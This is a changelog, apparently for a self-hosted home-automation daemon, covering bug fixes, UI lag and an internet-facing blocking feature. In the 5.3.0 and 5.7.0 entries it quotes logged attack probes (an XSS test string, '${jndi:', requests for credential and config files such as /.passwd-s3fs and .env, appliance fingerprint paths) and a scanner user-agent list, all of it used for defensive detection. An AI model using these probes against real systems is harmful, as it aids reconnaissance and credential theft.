  places read the list of sockets and only the poll round took the lock, so a
  save underneath any of them raised "dictionary changed size during
  iteration": an "everything off" press did nothing at all, a poll lost its
  reading, a page poll answered 500. The new list is now built beside the old
  one and put in place in a single move.
- **The quarter-second beat walked a queue two other threads were appending
  to.** One unlucky moment raised, and that beat lost the schedules, the
  waiting rules and the whole half-minute round with it.
- **Four lights taken over by one press kept one hold between them**, because
  four threads read the same list and the last one to write won - and giving
  them back lost three of the four the same way, which with "hold until I
  give it back" left those lights out of their rules' reach for good.
- Smaller: a group was worked out twice for every report (and both workers
  could record it), the heating caches were thrown away by every reading in
  the house, the words for a rule or a schedule walked its whole list on
  every ask (a couple of thousand walks per status), the MQTT prefix map was
  rebuilt for every message under a lock, and "the rules are behind" was
  logged once per reading rather than once.

What made the page jump:

- **The socket cards were rebuilt on every reading.** The "nothing changed"
  shape carried "3 s ago" - a clock - so it never matched, and the whole grid
  was thrown away several times a second: a hovered history icon or an open
  card menu vanished under the pointer. The words are in the shape only when
  a socket is stale, which is the only time they are shown.
- **The latency card measured itself**: its signature carried how long the
  last paint took, so it rebuilt its forty rows on every tick for ever.
- **Settings → Data asked the daemon for its health on every wake** - ten
  requests a second in a busy minute - and a refused backup list was asked
  for again on every tick, for ever, putting the PIN box up each time.
- The presence chips and the People editor were rebuilt once a second by
  countdowns inside their own signatures; the built-in text commands had no
  signature at all; the History tab rebuilt its sixty-device dropdown every
  tick; the sessions list posted every five seconds from every Settings
  section; and the sequence and one-tap editors built the whole target list
  once per row.
- A country picker left open was thrown away mid-choice by the next repaint;
  the Heating and Events tabs were never marked for a redraw, so leaving and
  coming back showed what was there when you left; two database jobs at once
  cleared each other's clocks; and the message log, refused once, was never
  asked for again.
- The relay now filters the unlock token it forwards the way it filters every
  other value that goes into a header, and clamps the one count it did not.

5.7.0 — what the front server's logs of 23 September to 3 October say.

Eleven days of the server that faces the internet, read through the daemon's
own weighing: 2,900 requests from 528 addresses, and 589 things Suricata saw.
Over that batch, where 5.6.0 kept 107 addresses out and the slowest round took
forty requests to stop, this keeps 118 out and the slowest takes nineteen.

**A page loading is not somebody hammering.** The worst thing in the batch was
done by this house: the notification server's web app asks for thirty of its
own files the moment it opens, and while that server was restarting every one
of them came back 502 and the browser retried the lot. Twenty requests in ten
seconds is what the hammering rule looks for, so the owner's own browser was
kept out of his own notifications after forty of them. A burst is now counted
only over what was **turned away** — and on the notification server's road only
over the four answers that road already treats as a stranger, because a browser
there gets a 404 for a file ntfy does not ship and a 502 for a failure of ours.

**What a round asks for before it tries anything: "what are you?"** One address
asked for a hundred and thirty-three appliance files in thirty-nine seconds;
the small rounds are the reason for the new rule, though — three or four
pages like `/dana-cached/hc/HostCheckerInstaller.osx`, `/RDWeb`, `/wsman`,
`/ext-js/app/common/zld_product_spec.js` or `/officescan/console/`, each at a
name this machine does not carry, which weighed as three or four people
mistyping an address and took seventeen requests to stop. The names only one
product answers to are now read as what they are — **asking what this machine
is** — and three of them is a round. A name this house actually serves and
answers is nobody's fingerprint, however product-shaped it looks.

**Bytes that are not a request at all are counted every time.** A Remote
Desktop handshake arrived at the web port three times in one second, three
times a day, from six addresses in two neighbouring streets — and every visit
was "the same thing again within a breath", folded into one, counted once and
forgotten before the next. Suricata called it a scan each time. All six are
now kept out after three, and the address next door doing the same a minute
later counts as the one tool it is.

5.6.0 — the addresses on their way to being kept out, and the flags.

The card that keeps addresses out showed the ones already on the list. What
was being *counted* — the addresses the weighing has an eye on, which are
where a block comes from — was a bare line or two above it, and on a house
that faces the internet that is where the next hour is decided.

- **“On their way to being kept out” is now a fold of its own**, the same
  shape as Blacklisted IPs below it: a count in the head, a filter, pages,
  and it can be shut. Open by default, because what is about to happen is
  worth seeing.
- **Each line carries what a blocked line carries**: the marks (watched,
  where it was seen, the notification server's log, the lists that name it,
  what Suricata saw), the country's flag, what Shodan said and the buttons
  to ask Shodan and Talos, the address as an object like every other, the
  kinds of thing it has been doing and when they are forgotten.
- **A bar says how near it is**: what it has on its account against what
  earns a block, in green, amber and red — and, in words, **what it would
  get if it went over**, worked out from the same ladder, sensitivity and
  “what counts as serious” that the block itself would use: “the third time
  from this address: 24 h”, “for good, by the ladder”. Where the settings
  say nothing will happen — keeping addresses out switched off, an address
  that is never kept out, the house's own — it says that instead of drawing
  a promise.
- **The × on the right forgets that one address**, the same as the button
  that forgets them all, and asks for the PIN as everything there does.

And, beside every text filter over addresses, **a dropdown of the countries
in those rows, each with its flag** and how many rows are its: the watched
fold, all three blocked folds, the presses, the story of every address, and
the sheet of what the router is carrying. Addresses no list could place are
one choice of their own rather than none.

5.5.0 — a read through the whole application for bugs, lag and latency.

Nothing new to use: this is what a sweep through the daemon and the dashboard
found, each fault proved by a check that fails on 5.4.1 and passes here.

What was quietly broken:

- **The device list saved while a poll round was running killed the polling
  for good.** A box added or removed underneath the round ended the thread
  with "dictionary changed size during iteration", nothing started it again,
  and every socket then sat at its last reading until the daemon was
  restarted - with nothing said anywhere. The round now works from a copy
  taken under the lock, and whatever else goes wrong in it is logged and the
  polling carries on.
- **Renaming a socket left every rule, binding, sensor group and script that
  *read* it pointing at a name that no longer meant anything** - and a rule
  watching nothing simply never fires. A rename now follows what reads a
  thing as well as what switches it, the second and third source of a
  paired rule included, and inside a script's conditions
  ("if Lamp.power > 10"), where only whole lines were followed before.
- **A rule whose value came back as a word took the whole of /api/status with
  it**, and with it every card on the page.
- **A rule told to wait could be late by as long as a slow Wi-Fi controller
  took to answer.** The quarter-second clock that counts the waiting rules
  down asked the controller who was at home; it now asks with what is already
  known and leaves the fresh look to the rules firing in the moment.
- **An hourly cap counted what was armed, not what happened.** Somebody at a
  desk moving every couple of minutes armed and called off the same delayed
  action over and over, met "max per hour" without a single socket having
  been switched, and then stayed quiet for the rest of the hour.
- **A socket the house only watches could be told to switch again** from the
  object view, and **a blank row carrying the section it was added under**
  was taken for a half-filled one, so the whole list refused to save.
- **A slow number written as a word woke every page at once** - a last_seen
  as an ISO date, a voltage in quotes - and the settable Zigbee keys were
  worked out afresh for every room on every status (the cache had been dead
  since the day it was written).

What was slow or jumpy on the page:

- **The socket cards were thrown away and built again for every new
  wattage** - about once a second in a house with a dozen boxes, taking
  every tooltip, every hover and the scroll position with them. The figures
  are now written into the cards that are already there, and a card is only
  rebuilt when the socket itself changes.
- **A schedule or a scene changed somewhere else** - another browser, the
  CLI, a script - **never reached the card until the page was reloaded**: a
  count says nothing when a row is edited rather than added. The daemon now
  sends a fingerprint of each saved list, and unsaved edits still win.
- **A dismissed PIN box left a socket saying it was switching**, and its
  button dead, until a reload.
- The target pickers were hooked up again on every refill, the device and
  target lists took turns evicting each other from a cache with one slot,
  and a row not yet saved stood nineteen pixels to the left of every row
  around it, so the table shifted the moment it was saved.

5.4.1 — the countdown stays, and counts.

The orange "· off in 5 s" appeared and vanished again instead of running down
to nothing. The daemon says how long is left whenever it says anything at
all - but while a rule waits, nothing happens in the house, so nothing wakes
the page: the number stood still until some unrelated report arrived, and
what was left of it was wiped by the next redraw.

- The browser now counts it down **on its own second**, from the moment the
  daemon said how much was left, and re-reads that number whenever a status
  does arrive. It is drawn with the rest of the line rather than a second
  later, so a redraw in the middle no longer blinks it away.
- When it runs out it goes by itself, and when the daemon says the waiting
  is over - it acted, or it was called off - what is left of it goes with
  that answer, whether or not the rule has a reading of its own to show.
- A rule deleted takes its countdown with it.

5.4.0 — a rule can wait before it acts.

- **"Then wait N s"**, on every rule, beside "must hold". The rule is
  weighed as before; when it comes out true, what it does is put off for N
  seconds. Two things make it what a motion light needs:
  - the waiting **starts again** every time the condition becomes true
    again, so it is always counted from the last time;
  - it is **called off** the moment the condition stops being true.

  So a PIR that holds its own occupancy for a minute and then says 0, with
  `occupancy = 0 → off, then wait 120 s`, puts the light out two minutes
  after the sensor let go - and not at all if somebody moves in between.
  It works the same for on, toggle, pulse, a scene or a message.
- **What is waiting is on the screen**: the rule's own line counts it down
  ("· off in 1 min 42 s"), and the object view says it in words ("it waits
  2 min before it acts (1 min 42 s left)").
- The wait is checked on the quarter-second beat, so it is the time it says
  rather than "some time after the next report". A rule switched off, or
  whose window has closed, or whose presence gate no longer holds, does
  nothing when its moment comes. Nothing is remembered across a restart: a
  wait that was running when the daemon stopped does not act afterwards.
- `after_s` travels with an export, an import and the object view, so a
  script or a text message can set it: `Rule.after_s = 120`.

**How it differs from "must hold"**, which is beside it: *must hold* waits
for the **condition** - the rule does not fire until the reading has been
past the line for that long, and a flicker starts it again. *Then wait*
waits after the rule has fired, with the action on a leash: whatever made it
true is already true, and the leash is dropped if it stops being true. For a
PIR either can switch a light off; the wait is the one to reach for when the
condition is a single edge ("it said 0") rather than a level to sit at.

5.3.0 — a week of the front server's own logs, read again.

Six thousand five hundred requests from 604 addresses, 17-26 September 2026,
replayed through the weighing. Before: 110 addresses kept out, and the worst
of them made 61 requests first. After: **121 kept out, and the worst made
21**. What the house itself does - the watch pressing a link, the phones
holding their notification connection open, the publisher - is weighed as
nothing, as before.

- **A burst is the signal, whatever it asks for.** One address asked for "/"
  fifty-eight times in five seconds and was never kept out: every one of them
  was "the same thing again within a breath", so all fifty-eight counted as
  one. Twenty requests in ten seconds is now written down once, and again at
  every twenty, so a burst ends while it is still running. A browser opening
  a page asks for four different things and is not a burst.
- **A tool that says its own name is weighed as one.** zgrab asked 227 times
  that week, Go's own client 92, Odin 51, Censys 23, leakix 21 - each visit
  small enough to pass. Those names, and thirty more (masscan, nuclei, zmap,
  sqlmap, WPScan, Nikto, ffuf, InternetMeasurement…), are now read from the
  user agent; the house's own words are not, and neither are the search
  engines - being crawled is not being scanned.
- **The probe is read however it is spelt.** A path is now unquoted twice
  before it is weighed, so the same probe written plainly and written
  percent-encoded are one thing: `/?parameter=<script>alert(1)</script>` and
  `%3Cscript%3Ealert%281%29%3C%2Fscript%3E` both arrived here twelve times,
  and only the plain one had ever counted. A payload in the query - a script
  tag, `cmd.exe`, a SQL union, a shell substitution, `${jndi:` - is weighed
  like one in the body.
- **What that week asked for, and no list knew**: a password file for an S3
  mount (`/.passwd-s3fs`, nine times in five seconds), the site's own name
  with `.sql` on it, a Spring application's settings, the config of an "AI
  proxy" that is not here (`/anthropic/config.json`, `/openai-proxy/…`), and
  the little files that give an appliance away - Cisco's `/+CSCOU+/`, Sophos'
  `/auth_portal/`, Fortinet's `ftnt-icons.woff`, an InfluxDB `SHOW
  DIAGNOSTICS`, a Pulse or a GlobalProtect login page.
- **A word that is not an HTTP method at all** - "ASDE" came twelve times -
  is weighed as the nonsense it is rather than passed over.
- **Somebody who pressed a link and was let in is the house.** The owner's
  own watch, on the mobile network, collected twenty-odd 504s while the house
  server was slow and then a 403 while a link was being changed. An address
  that has been let in within two days is no longer weighed for the light
  things - a refusal, a knock, a wrong name, a burst - though asking for
  `.env` still counts, because that is not what a watch with a stale link
  does.

5.2.0 — a sensor, a button, and the light at once.

Everything on the way from something happening in the house to the relay
moving, and to the screen showing it, read through again with a stopwatch.
`test/realtime.py` is that stopwatch, and it is part of the suite now.

- **A press no longer waits out a poll already on the wire.** One request at
  a time per box meant a press landing mid-poll waited for the poll to come
  back - up to the poll timeout, five seconds of a light not coming on. A
  poll is a read and a press is what somebody is standing there waiting for,
  so a command now queues behind other commands only. Measured on the test
  box: **1 752 ms → 2 ms** with a two-second poll in flight.
  (`plug_command_overtakes_poll`, on by default; off for a box that cannot
  answer two things at once.)
- **What the pages are woken for is now what it says.** 5.1.0 began waking
  them together for reports that were "only numbers" - but a light's
  `state`, a PIR's `occupancy`, a door's `contact` and a leak are numbers to
  a computer, so the very things somebody watches for took the slow path and
  showed up half a second late. A state - anything that is a word, a yes/no,
  or a number whose name is not a reading - is on the screen at once; the
  slow numbers (temperature, humidity, link quality, battery, watts, energy,
  uptime, signal) still wake the pages together, at most twice a second.
- **A "must hold for N s" rule fires on time in a busy house.** The
  quarter-second beat that finishes those rules was skipped whenever the
  presence queue had anything in it at all - and "no motion for ten minutes"
  is exactly the rule that has to fire on time.
- **A big scene no longer waits on the broker's acknowledgements.** Twenty
  things switched at once is twenty MQTT publishes, and the client let
  twenty be in flight and then waited; the limit is lifted for what is, on
  this machine, a broker on the same machine.
- **A socket's button comes back when the box has answered**, not three
  seconds later whatever happens. A socket that switched in twenty
  milliseconds could not be switched again for three seconds; the timer is
  only a safety net now. The same for the counter resets.

Measured on the test box, end to end - the report arriving, the rules and
bindings running on their own threads, the command going out over HTTP:
motion to the light **2 ms**, a button press to the relay **1 ms**, and a
press during a two-second poll **2 ms**.

5.1.0 — the arrow is back, and a read through the whole application.

- **A box that opens a list looks like one again.** Nineteen rows set a
  background of their own, which wiped out the arrow the base select draws -
  so those boxes were plain fields with nothing to say they could be opened,
  and what looked like the arrow was the object mark sitting on top of it.
  The arrow is drawn from one named value (`--pickarrow`) and put back in
  every row that restyles its boxes; `test/columns.py` measures both from the
  page and refuses a row that takes the arrow away without putting it back.

**What was wrong, found by reading the whole of it**

- **A renamed socket took nothing with it.** Every rule, schedule, binding,
  presence trigger, scene, sequence, one-tap link, text command and action
  group keeps a socket's bare name, and renaming the socket left all of them
  pointing at a name that no longer existed - firing nothing, in silence.
  They follow it now (`retarget`), and so do `bindgroup:` targets when a
  section of buttons is renamed.
- **A list the daemon would not give us became an empty list.** One refused
  answer and the action groups, the sensor groups and the text commands said
  "none yet"; the next Save wrote that emptiness over the real thing. A
  refusal now leaves the list unread, says so on the card, and is asked for
  again. The scenes, sequences and schedules had the other half of it: a
  refused ask left the card blank and never asked again.
- **A switched-off one-tap link still acted** when the second factor was Duo:
  the switch was tested after the Duo branch, so the phone rang and anybody
  who approved it made it happen. `press()` from a script or the object view
  ignored the switch too. A switched-off sequence was still reset by a
  `seqreset:` target.
- **Putting a kept version back now takes effect**: the device list rebuilds
  the live one (it was put back on the screen while the daemon went on
  polling the old one), and people and schedules drop runtime state for rows
  that are gone. Saving people or presence triggers keeps a version to go
  back to at all - both were listed for it and neither ever wrote one.
- **Rows that were silently dropped or silently refused.** A schedule with a
  section and a time but no target was dropped; a sequence step that nobody
  could do any more vanished from a list somebody never touched; an
  unfinished button binding refused the whole list. Each is now either passed
  over as the blank it is, or said out loud.
- **Switching a whole section of buttons** flipped each row on its own, so a
  half-on section became its own inverse and the log said "switched on"
  whatever happened. It moves as one thing now, and a section that is not
  there says so.
- **A channel of a box switched off as a whole** answered "it is on" and
  stayed off. It says what is really in the way.
- **Smaller ones**: a script kept no section; the Overview kept its own order
  for good once saved, and stopped following the house; the rooms editor
  typed straight into the state everything else reads; the Wi-Fi card froze
  for the session if a dropdown was set back to the same value; the object
  list could never be read again once read, so a thing made afterwards was
  unknown to every mark; the reporting table failed in silence; a mark in a
  box that follows a choice kept the first choice's spoken name.

**Lags and latency**

- **Numbers no longer wake every page at once.** A temperature or a link
  quality now wakes the pages together, at most twice a second
  (`bump_soon`); a press, a new device, a key never seen before or something
  coming back from offline still wakes them at once. Two dozen sensors
  reporting every ten seconds used to mean several full status fetches a
  second, per open tab.
- **The schedules are read once a minute**, not four times a second - for a
  sunrise or sunset entry that was a full solar computation per schedule per
  beat.
- **What a Zigbee device will let us set** is worked out once a moment
  instead of once per room: the heating asked for the whole list nine times
  over in a house with eight rooms, on every status.
- **The peaks seek instead of walking**: a new index (`samples_hourly(key,
  ts)`) for "the most the house drew this week", which walked every device's
  every key across the window under the one lock every reader needs.
- **"of how many altogether"** in the events search is kept for half a
  minute rather than counting a two-year table again on every keystroke.

5.0.0 — every row wears its own mark.

- **A row is a thing, and says so.** Every row anybody can add with a + -
  a rule, a binding, a schedule, a presence trigger, a scene, a sequence, a
  sensor or action group, an SMS command, a one-tap link, an alert message,
  a script, a person, a gateway, a plug or sensor, a room - now carries its
  own mark at its left edge, in line with its section's above it. Clicking
  it opens that row: what it is, what it reads, and what can be done with
  it from a script, a fact, a condition or a text message. A row that has
  not been saved yet has no mark, because there is nothing to open until it
  exists.
- **The marks inside a row's boxes name what those boxes point at.** The
  rule's own mark used to sit inside its Source box, where it read as the
  mark of the device in that box; the binding's sat in its button box and
  the schedule's in its target box. Those boxes now carry what they
  actually choose - the device or group a rule reads, the button a binding
  listens to, what a schedule switches, the person a presence trigger
  watches - and the row's own mark is at the row's edge, once.
- **A mark in a box that opens a list no longer sits on the arrow.** A
  select draws its own arrow at its right edge and the mark was drawn on
  top of it: two symbols in one place. In those boxes the mark goes at the
  left, where nothing else is. `test/columns.py` measures it from the page
  itself, so the two cannot drift back together.
- A box whose choice is not a thing of its own - a name since deleted -
  shows no mark at all rather than one that opens nothing.

4.99.0 — the PIN shows what it unlocks, at once.

- **Typing the PIN brings the locked views back without a reload.** The
  message log was the one that showed it: while locked the daemon refuses
  that read, and the log had already written down that it had asked, so
  unlocking changed nothing until F5. Everything read from behind the PIN
  is now forgotten the moment the lock moves - the message log, the
  database backups, the press and blocked lists, who is holding an unlock,
  the addresses the completer offers - and asked for again in one place
  (`lockChanged`), rather than each view having to remember to do it.
- **Locking again takes what the PIN showed off the screen.** The messages,
  the blocked and press lists, the Wi-Fi clients, the public half of an ssh
  key: all of them stayed until something else happened to redraw them.
- **A refused ask is not an answer.** The message log, the addresses behind
  the completer and the energy reading wrote "asked already" before asking,
  and a refusal left it standing: one failure and the view never asked
  again.
- **A dismissed PIN box no longer silences the offer for good.** Closing it
  once left the page unable to offer the PIN again for the life of the
  page, so every refused read after that failed in silence. Now it stops
  asking only until you go looking somewhere else - another tab or another
  section - and then it offers again.
- **The Zigbee reporting table and the bindings editor are two different
  things.** One global (`BINDINGS`) held both, so opening the editor
  overwrote what the bridge had said and the reporting table went blank for
  up to a minute. The table keeps its own (`ZBIND`).

4.98.0 — a rule is one thing, and the records are objects too.

- **A rule is its whole pack.** The main line and the quiet line under it -
  the second and third condition, the window, "must hold", the cooldown -
  are one rule: under the pointer the whole of it lights up once (the inner
  line no longer draws a second outline), and switched off the whole of it
  is dimmed, not only its first line. Its mark, in its first box, is the
  rule's own: `rule:<id>` with everything that rule has.
- **A row switched off is dimmed whole** wherever it lives: presence
  triggers, SMS commands, action and sensor groups, and the scenes,
  sequences, messages and scripts that have no switch of their own.
- **The records are objects now**, each with its mark on its row:
  - `snapshot:<id>` - what a Save replaced: `key`, `at`, `rows`, `why`,
    `restore()`, `forget()`;
  - `dbfile:<name>` - a database backup: `at`, `bytes`, `megabytes`,
    `restore()`, `forget()`;
  - `outbox:<id>` - a text the gateway would not take: `text`, `tries`,
    `last_error`, `send()`, `drop()`;
  - `smslog:<id>` - one message in the log (found by its id, never listed -
    there are hundreds): `direction`, `person`, `text`, `at`, `ok`,
    `forget()`, `reply(WORDS)`, `send_again()`;
  - `session:<id>` - a browser holding the PIN: `client`, `until`,
    `minutes_left`, `lock()` - one browser locked out on its own.
  Numbers and the browser behind them need the PIN, as everywhere else.
- **The diagnostic rows** point at what they are about: each line of the
  MQTT ACL check at the socket it is for, and each row of the Zigbee
  reporting table at its device. The reporting table's mark sits in the
  gap after the device name, so the table is no taller on a phone than it
  was before.

4.97.0 — every section is an object, and everything can be switched off and on.

- **A section of any editor** - "PIR" under Rules, "Loznice" under Button
  bindings, "Falco" under presence triggers, the scenes', the messages',
  the plugs' own - is an object, with a mark after its count:
  - `PIR.enabled` reads `on`, `off` or `some`; `PIR.enabled = off` switches
    every row in it off, `PIR.disable()`, `PIR.enable()`, and
    `PIR.toggle()` (all off if any is on, all on otherwise);
  - `PIR.count`, `PIR.on_count`, `PIR.items`, `PIR.editor`;
  - `PIR.name = Motion` renames it, and its rows follow.
  A section is called by its name when nothing else has it, and otherwise
  by its address: `section:rules/PIR`, `section:bindings/Loznice`.
- **Everything that can be switched off** - a rule, a schedule, a button
  binding, a presence trigger, a one-tap link, an SMS command, an action or
  sensor group, a person, a plug, a sensor, and now a scene, a sequence, an
  alert message and a script too - has `enabled`, `enable()`,
  `disable()` and `toggle()`, the same everywhere. A scene, a sequence, a
  message or a script switched off is kept and does nothing; its name is
  struck through in its editor.

4.96.0 — a battery Shelly asleep is not a Shelly gone.

A Shelly on a battery - the H&T - wakes, reports and goes back to sleep, and
each time it sleeps the broker publishes its last will: `online = false`.
Until 4.95 that word was never read at all (a fault of its own); 4.95 began
to read it, and every battery H&T turned red - CRIT, "reported offline by the
bridge" - a minute after every report. Now:

- `online = false` from a Shelly that has told us about its battery is it
  going to sleep, and changes nothing. One that really stops is caught by
  its silence, like every sleeping sensor.
- A mains Shelly that goes away is still offline - in its own words, "said
  it went offline", not the Zigbee bridge's - and is online again the
  moment it reports, without waiting for its own word.

4.95.0 — a read through the whole application: faults and lag.

**Things that did nothing while saying they were done**
- A target written as text - a script's `on Plug-A`, a text message's
  `Plug-A off`, the object view's `Rule.enabled = off`, a plug's `reboot()`,
  a link's `press()` - was handed on as text and read letter by letter:
  nothing was switched. It is fired as what it stands for.
- A presence trigger outside a group was taken for an empty new row and
  dropped on every save (it keeps its target under "plug").
- A presence trigger that marks somebody else home hung the Wi-Fi thread
  for good (it came back for the lock it was holding), and every phone
  report after it. What an arrival sets off now runs after the lock.
- "What is open" always said everything was shut; a battery at 0 % counted
  as full; the trouble sentence lowered every name in it.
- A Shelly on MQTT never went offline or came back (its bare true/false was
  thrown away before it was read).
- The SIM credit was asked of the modem every five minutes (on the router's
  beat), even with the setting at 0 - a load on the TRB140 that may well
  have slowed texts. Now as set, and a failed ask waits an hour.

**Safety**
- A block list switched off still decided bans (its rows stay until it is
  fetched again). Only lists that are on count.
- With no PIN set, private SSH keys and database backups downloaded for
  anybody; they are refused as the other secrets are.
- With the view switched off, the status (people, phones, MACs) was still
  answered. It asks for the PIN like every other view.
- Wrong PINs locked the whole house for everybody; now whoever typed them
  (many callers together still lock all). A phone's presence reports are
  counted per caller too.
- Restoring the oldest backup could delete it first and copy an empty
  database over the live one. The file being restored is never pruned, and
  a missing file is an error.
- The blocked ranges were rebuilt in place while other requests read them.

**Texts**
- The daily cap counted only the newest thousand events; now the table.
- Alerts no longer wait behind the gateway: ntfy and Telegram go first, texts
  by a worker of their own.
- A stranger gets "not allowed" once a day, not a paid answer to every
  message, and not sent inside the webhook.
- The message log and the outbox are written one at a time (entries were
  lost), two flushes never send the same message twice, and the second
  look at the modem's inbox twenty seconds on happens.

**Other**
- A schedule no longer fires twice after a restart; "6:30" is half past six
  (it stopped the nightly backup); a way back past "equal to" is refused
  (it broke every rule after it); two presses at once step a sequence
  twice, not the same step twice; a second leak alarm within 15 minutes is
  said; a Shelly toggle is not retried after a timeout (it toggled twice);
  a device's settings are asked for once per wake; binding_tries and
  binding_mend do what they say.
- The PHP relay: reordering rooms no longer wipes the Overview's card
  order; an empty threshold is not saved as 0; a one-tap link waiting for
  approval is waited for (it said "not responding" after 10 s).

**Lag**
- The page rebuilt every card grid about once a second in a busy house
  (each device's age), the rules editor with every reading, the SMS tab
  and its last 300 messages every tick, the events list on every change,
  the blocked list every second, the power history every tick and the
  energy bars with it. Each now redraws only when what it shows changed.
- "Paused" pauses; live updates resume at once after the daemon restarts;
  a status that never answers no longer freezes the page; the search box
  builds its index once per search; help panels no longer stay stuck after
  a redraw; a chart's zoom does not carry over to another device.
- The daemon: the weather is fetched beside the status, not in its path;
  the heating picks up plan steps without waiting for a change; the power
  chart reads by the table's key instead of the whole samples table;
  indexes for the blocked history and the one-tap log; the Suricata reading
  writes beside the reading.

4.94.0 — a block list that does not download says which one it is.

Under Settings > Blocking, a list whose last fetch failed used to show one
yellow line - a time and what came back - under its row, where it could be
read as belonging to the list above or below it. It is now a block of its
own, set off by a yellow edge, that starts with the list's name and says:

- **what came back** - the error, whole;
- **asked** - the address it was fetched from (for the Talos list, your own
  address or file if one is set), shown without a user, a password or a
  query string that could carry a key;
- **how often** - how many times in a row it has failed, the first and the
  last time;
- **meanwhile** - whether the copy fetched before is still keeping addresses
  out, and how many ranges it holds, or that nothing is held from it yet;
- **next** - when it is tried again by itself (an hour after a failure, six
  after a site asked to wait), or that it is switched off and not tried.

"Fetch them now" answers one sentence per list, by the name the rows show,
with a mark for the ones that came and the ones that did not.

4.93.0 — the last of the objects, and the page's own long-standing faults.

- **Ctrl+Space after `address:` and `client:`** offers the addresses on the
  blocked list and the Wi-Fi clients the page holds (the list is asked for
  with the PIN if it is not loaded yet); typing part of a client's name or
  the first digits of an address offers them too.
- **A Wi-Fi client by its name**: `Pixel.give_to(Jan)` - when no other
  object carries that name and only one client does. Two clients with one
  name are still reached by their MAC.
- **A scene's steps are offered as they are typed**: after
  `Vecer.steps =` the names of what a step can act on, then on / off /
  toggle / pulse / set:, then `after 5s` or the next step.
- **The blocked list on a phone** (4.92) - and in the page:
  - every dropdown says what it is for: when a rule may fire, a sunrise or a
    clock time, the reading and comparison of a rule's second and third
    condition, what a presence trigger reacts to, what an SMS command does;
  - "+ by name" under People has its icon like every other button;
  - a hidden writing desk under a one-tap link stays hidden however the
    styles are read.
- **Tests**: the page check read a square corner as a rounded one (five
  false alarms), changed a link the page had already thrown away (two
  false alarms and one missing preview), and pressed the first button in
  the blocked list rather than the row's own cross; `test/replay.py` ran
  against whatever config the machine had - with no PIN every PIN check
  passed - and now has a house, a port and a PIN of its own; one line of
  `test/taps.py` depended on whether two requests fell into the same second.

4.92.0 — the three that were left out are objects too.

- **An address on the blocked list** is `address:185.36.81.23` (a folded
  range too: `address:185.36.81.0/24`). It carries `blocked` (set it off to
  let the address back in, on to keep it out as the settings say),
  `forever`, `left_min`, `why`, `since`, `by`, `country`, `lists`, `times`
  and `spared`, and `ban(120)` / `unban()`. The kept-out list, the watched
  list and the history carry its mark. It is read with the PIN, as the
  blocked list is - without it the view says so and shows nothing.
- **A Wi-Fi client** is `client:aa:bb:cc:dd:ee:ff`: its name, the network,
  the access point, band, signal, whose it is (`belongs_to`) - its IP behind
  the PIN - and `give_to(Jan)` / `release()`, which change the person's
  devices under People. Both Wi-Fi client lists carry its mark.
- Neither kind is in the object list the page loads (there can be
  thousands, and clients come and go): each is found by its address when
  asked for. Ctrl+Space still offers their members after
  `address:1.2.3.4.` and `client:aa:bb:…:ff.`, and a script can call them:
  `address:185.36.81.23.ban(60)`.
- **A scene's steps** are one line to read and set:
  `Vecer.steps = Plug-A on; Plug-B off after 5s; Light pulse 600ms` - every
  field the Scenes editor keeps, so reading the line and setting it back
  changes nothing. A step is a name (or a target), then what to do, then
  `after Ns` if it waits.

4.91.0 — everything is an object, the last pieces.

- **Each kind of message** is a member of Notifications: `Notifications.kind_leak`
  is `default`, `off`, `house` or its own roads (`ntfy,sms`) - the same choice
  as the list under Notifications, set from a script, a text (with the
  switch) or the object view, where it is picked from a list.
- **A device's alerts**: `Temp-Loznice.alerts = crit_offline` - `default`,
  a preset, or `custom:crit,offline`.
- **A rule's second condition** is four things that only mean something
  together, so it is set in one go: `rule.second(Temp-Venek temperature > 20 or)`,
  and `second_clear()`.
- **What a socket drew**: `{Plug-UPS.today_wh}`, `yesterday_wh`, `month_wh`,
  `last_month_wh`, `year_wh` - the figures of the Energy table.
- The Wi-Fi access point tiles carry their mark.

4.90.0 — everything is an object, part five: the rest of the application,
the fields that were still read-only, and the boxes to set them with.

**No socket was an object until now.** The list is called "plugs" and was
asked for as "plug", so every socket's mark opened "could not read" - in
4.86 to 4.89. They are objects now, with their group, role, enabled and
monitor-only settable (the ones written in config.json are changed there).

**More of the application as objects:**
- **A room's day**: `Loznice.plan` reads and sets it as words -
  `06:30 comfort mon-fri, 8:00 comfort sat-sun, 22:00 night` - and
  `plan_add(12:00 eco mon,wed)`, `plan_remove(8:00)` and `plan_clear()` step
  it. Its thermometer and window sensors are set by name.
- **Notifications**: each road (ntfy, Telegram, SMS) and what is sent
  (critical, warnings, rules, gone quiet, switched), and `quiet()`,
  `digest()`, `clear()`.
- **Blocking**: how many are kept out and the newest, `ban(address [min])`
  and `unban(address)`; each **block list** (`feed-talos`, …) with its ranges,
  when it was fetched, its last error and `fetch()`.
- **Backups** (how many, the newest, `backup()`), **MikroTik** (`sync()`),
  and the **SMS gateway** device gets `poll()`, `flush()` and how many are
  waiting.

**Fields that were read-only:** what a rule watches (`device`, `key`), a
button's device and action, a sensor group's members, key and mode, a
sequence's steps (scene names), a script's body, a Zigbee gateway's target and
model, Wi-Fi presence on/off and its grace.

**Setting, made easier:** in the object view a value with a few possible words
(on/off, a mode, a choice setting) is picked from a list and set at once; a
target, a device or a scene is typed with the names offered. In a script,
after `Loznice.mode = ` Ctrl+Space offers what it may be. A value written out
in a script is checked when the script is saved - `Loznice.eco_c = 99` is
refused there, with the range - and nothing is set by the checking. Marks now
also stand in Ctrl+K's results and in the list of what needs attention.

**By text, the application stays on the dashboard.** A text sets the house -
rooms, sockets, scenes, the heating - as before, but `Settings.…`,
`Notifications.…` and a script's body only with *Let a text change settings
and scripts* switched on under Settings → SMS (off by default).
That switch is itself kept safe: no script, text or fact can turn it on.

4.89.0 — everything is an object, part four: what points at what, every field
an editor saves, renames that follow through, procedures of their own and
functions with brackets.

**What a thing acts on is set by name.** `Button-Topeni-single.target = Vecer`
points that button at the scene Vecer; `Break-in.level = crit`,
`rule.value = 3`, a schedule's `at = 06:45` and `days = weekdays`, a link's or
an SMS command's target, a presence trigger's event - every field the list's
own editor saves can be set, from a script, a text or the object view, and it
is saved through that editor's own save, so every check it makes is made. A
target takes a name as readily as a target: a socket, a scene, a sequence, an
action group, a message, a person, a room, `Light-Chodba.state_l1`. In the
object view a value that points at something carries that thing's mark: go to
it with a click.

**A rename follows through.** Rename the room Loznice to Bedroom - in the
editor, by a script, by text - and `{Loznice.eco_c}` in a message,
`Loznice.eco_c = 19`, `heat Loznice eco` and `on Plug-X` in a script become the
new name. Only where the old name now means nothing else and the new one means
this thing; each rename is written in the events with how many places it
changed.

